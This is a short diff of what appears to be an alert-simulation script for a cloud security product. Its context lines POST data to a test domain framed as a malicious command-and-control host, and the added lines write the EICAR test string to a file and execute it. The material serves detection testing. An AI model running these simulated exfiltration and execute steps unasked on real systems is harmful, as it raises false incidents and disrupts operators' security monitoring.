@@ -90,3 +90,9 @@ echo "Sending data to known malicious domain"
 curl -s -m 10 -X POST "http://mdc-eicar.alerts.security.azure.com?SendingData" -o /dev/null
 echo "C2 communication sequence complete"
 echo " "
+
+# anti-malware
+echo "--- Anti Malware ---"
+echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > ./infected_file 
+chmod a+x ./infected_file 
+./infected_file
